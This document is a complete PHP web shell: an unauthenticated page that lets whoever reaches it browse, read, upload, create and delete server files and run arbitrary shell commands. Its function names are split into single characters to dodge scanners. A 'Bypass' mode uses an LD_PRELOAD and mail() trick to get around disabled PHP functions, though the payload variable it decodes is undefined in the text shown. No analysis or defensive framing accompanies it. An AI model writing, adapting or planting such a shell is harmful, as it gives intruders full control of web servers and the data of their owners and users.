<?php
$htm = "h"."t"."m"."l"."s"."p"."e"."c"."i"."a"."l"."c"."h"."a"."r"."s";
function scanDirectory($path) {
    $items = [];
    if (is_dir($path)) {
        $scan = scandir($path);
        foreach ($scan as $item) {
            if ($item !== '.' && $item !== '..') {
                $fullPath = $path . DIRECTORY_SEPARATOR . $item;
                $items[] = [
                    'name' => $item,
                    'path' => $fullPath,
                    'type' => is_dir($fullPath) ? 'directory' : 'file'
                ];
            }
        }
    }
    usort($items, function($a, $b) {
        if ($a['type'] === 'directory' && $b['type'] !== 'directory') return -1;
        if ($a['type'] !== 'directory' && $b['type'] === 'directory') return 1;
        return strcasecmp($a['name'], $b['name']);
    });
    return $items;
}

function generateBreadcrumb($path) {
    $parts = explode(DIRECTORY_SEPARATOR, trim($path, DIRECTORY_SEPARATOR));
    $breadcrumb = [];
    $currentPath = '';
    foreach ($parts as $part) {
        $currentPath .= DIRECTORY_SEPARATOR . $part;
        $breadcrumb[] = '<a href="?path=' . urlencode($currentPath) . '">' . htmlspecialchars($part) . '</a>';
    }
    return implode('/', $breadcrumb);
}

$defaultRootPath = getcwd();
$rootPath = $_GET['path'] ?? $defaultRootPath;

$viewCommandResult = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmddef'])) {
    $pp = "p"."r"."o"."c"."_"."o"."p"."e"."n";
    $pc = "f"."c"."l"."o"."s"."e";
    $ppc = "p"."r"."o"."c"."_"."c"."l"."o"."s"."e";
    $stg = "s"."t"."r"."e"."a"."m"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
    $command = $_POST['cmddef'];
    $descriptorspec = [
        0 => ['pipe', 'r'],
        1 => ['pipe', 'w'],
        2 => ['pipe', 'w']
    ];
    $process = $pp($command, $descriptorspec, $pipes);
    if (is_resource($process)) {
        $output = $stg($pipes[1]);
        $errors = $stg($pipes[2]);
        $pc($pipes[1]);
        $pc($pipes[2]);
        $ppc($process);
        if (!empty($errors)) {
            $viewCommandResult = '<hr><p>Error:</p><textarea class="result-box">' . $htm($errors) . '</textarea>';
        } else {
            $viewCommandResult = '<hr><br><p>Result:</p><textarea class="result-box">' . $htm($output) . '</textarea>';
        }
    } else {
        $viewCommandResult = '<hr><br><p>Result:</p><textarea class="result-box">Error: Failed to execute command!</textarea>';
    }
}

if (isset($_POST['cmdbyp'])){
        $p = "p"."u"."t"."e"."n"."v";
        $a = "fi"."le_p"."ut_c"."ont"."e"."nt"."s";
        $m = "m"."a"."i"."l";
        $base = "ba"."se"."64"."_"."de"."co"."de";
        $en = "ba"."se"."64"."_"."en"."co"."de";
        $drnm= "d"."i"."r"."n"."a"."m"."e";
        $currentFilePath = $_SERVER['PHP_SELF'];
        $doc = $_SERVER['DOCUMENT_ROOT'];
        $directoryPath = $drnm($currentFilePath);
        $full = $doc . $directoryPath;
        $cmdd = $_POST['cmdbyp'];
        $meterpreter = $en($cmdd." > out.txt");
        $viewCommandResult = '<hr><center>refresh the page and check out.txt<br>putenv() & mail() function must be enabled<br>if out.txt not created means the server is not vuln<br>or the required function is disabled.<br></center>';        
        $a($full . '/chankro.so', $base($hook));
        $a($full . '/acpid.socket', $base($meterpreter));
        $p('CHANKRO=' . $full . '/acpid.socket');
        $p('LD_PRELOAD=' . $full . '/chankro.so');
        $m('a','a','a','a');
    }

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['delete_path'])) {
    $deletePath = $_POST['delete_path'];
    if (file_exists($deletePath)) {
        unlink($deletePath);
        echo "<div class='alert alert-success'>Deleted: <strong>" . htmlspecialchars($deletePath) . "</strong></div>";
    } else {
        echo "<div class='alert alert-danger'>Cannot delete file or file not existed.</div>";
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['filename'])) {
    $path = $_POST['path'] ?? $rootPath;
    $filename = $_POST['filename'] ?? '';
    $content = $_POST['content'] ?? '';
    
    if (!empty($path) && !empty($filename)) {
        $filePath = rtrim($path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $filename;
        file_put_contents($filePath, $content);
        echo "<div class='alert alert-success'>File created: <strong>" . htmlspecialchars($filePath) . "</strong></div>";
    } else {
        echo "<div class='alert alert-danger'>Path and file name must be filled.</div>";
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file_upload'])) {
    $uploadPath = $_POST['upload_path'] ?? $rootPath;
    
    if (!empty($uploadPath) && is_dir($uploadPath)) {
        $fileName = basename($_FILES['file_upload']['name']);
        $targetFile = rtrim($uploadPath, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $fileName;
        
        if (move_uploaded_file($_FILES['file_upload']['tmp_name'], $targetFile)) {
            echo "<div class='alert alert-success'>File berhasil diunggah ke: <strong>" . htmlspecialchars($targetFile) . "</strong></div>";
        } else {
            echo "<div class='alert alert-danger'>Upload fail.</div>";
        }
    } else {
        echo "<div class='alert alert-danger'>Path is not valid or not existed.</div>";
    }
}

if (isset($_GET['view_file'])) {
    $filePath = $_GET['view_file'];
    if (file_exists($filePath) && is_file($filePath)) {
        $fileContent = htmlspecialchars(file_get_contents($filePath));
        echo "<div class='alert alert-info'><strong>" . htmlspecialchars($filePath) . "</strong></div>";
        echo "<pre class='file-content'>$fileContent</pre>";
    } else {
        echo "<div class='alert alert-danger'>File not found or cannot opened.</div>";
    }
}

$scannedItems = scanDirectory($rootPath);
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: #111;
      color: #ccc;
      font-family: monospace;
      font-size: 16px;
      padding: 16px;
      line-height: 1.5;
    }
    a {
      color: #8ab4f8;
      text-decoration: none;
    }
    a:hover {
      text-decoration: underline;
    }
    .panel {
      margin-bottom: 20px;
    }
    input, textarea, button {
      background: #000;
      border: 1px solid #444;
      color: #ccc;
      font-family: inherit;
      font-size: 16px;
      padding: 6px;
      width: 100%;
    }
    button {
      cursor: pointer;
    }
    button:hover {
      background: #222;
    }
    ul {
      list-style: none;
      padding: 0;
      margin: 0;
    }
    li {
      padding: 6px 0;
      border-bottom: 1px solid #222;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    .result-box {
    white-space: pre;
    overflow: auto;
    resize: vertical;
    width: 100%;
    }
    .breadcrumb {
      margin: 12px 0;
      font-size: 15px;
    }
    .file-content {
      background: #000;
      border: 1px solid #333;
      color: #ccc;
      padding: 12px;
      font-size: 15px;
      white-space: pre-wrap;
      max-height: 400px;
      overflow-y: auto;
    }
    .alert {
      background: #1a1a1a;
      border-left: 3px solid #008000;
      padding: 8px;
      margin-bottom: 12px;
      font-size: 15px;
    }
    .alert-danger {
      border-left-color: #800000;
    }
    .alert-success {
      border-left-color: #008000;
    }
    .alert-info {
      border-left-color: #005580;
    }
  </style>
</head>
<body>
  <div class="panel">
    <form action="" method="post" enctype="multipart/form-data">
      <input type="file" name="file_upload" required>
      <input type="hidden" name="upload_path" value="<?php echo htmlspecialchars($rootPath); ?>">
      <button type="submit">Upload</button>
    </form>
  </div>

  <div class="panel">
    <form action="" method="post">
      <input type="text" name="path" placeholder="Path" value="<?php echo htmlspecialchars($rootPath); ?>" required>
      <input type="text" name="filename" placeholder="Filename" required>
      <textarea name="content" placeholder="File content"></textarea>
      <button type="submit">Create</button>
    </form>
  </div>

<div class="panel">
  <form action="" method="post" style="margin:0">
    <input
      type="text"
      name="cmdbyp"
      placeholder="Enter command"
      autocomplete="off"
      required
    >
    <button type="submit">Run Command [Bypass]</button>
  </form>
</div>

<div class="panel">
  <form action="" method="post" style="margin:0">
    <input
      type="text"
      name="cmddef"
      placeholder="Enter command"
      autocomplete="off"
      required
    >
    <button type="submit">Run Command</button>
  </form>
</div>

<?php if (isset($viewCommandResult)) echo $viewCommandResult; ?>

  <div class="breadcrumb">Path: <?php echo generateBreadcrumb($rootPath); ?></div>
  <ul>
    <?php foreach ($scannedItems as $item): ?>
      <li>
        <span>
          <strong><?php echo $item['type'] === 'directory' ? '[D]' : '[F]'; ?></strong>
          <?php if ($item['type'] === 'directory'): ?>
            <a href="?path=<?php echo urlencode($item['path']); ?>"> <?php echo htmlspecialchars($item['name']); ?></a>
          <?php else: ?>
            <a href="?path=<?php echo urlencode($rootPath); ?>&view_file=<?php echo urlencode($item['path']); ?>"> <?php echo htmlspecialchars($item['name']); ?></a>
          <?php endif; ?>
        </span>
        <?php if ($item['type'] === 'file'): ?>
          <form action="" method="post" style="margin:0;">
            <input type="hidden" name="delete_path" value="<?php echo htmlspecialchars($item['path']); ?>">
            <button type="submit" style="width:auto;padding:4px 8px;">Delete</button>
          </form>
        <?php endif; ?>
      </li>
    <?php endforeach; ?>
  </ul>
<script>
document.addEventListener('DOMContentLoaded', () => {
  document.querySelectorAll('.result-box').forEach(t => {
    t.style.height = 'auto';
    t.style.height = t.scrollHeight + 'px';
  });
});
</script>
</body>
</html>
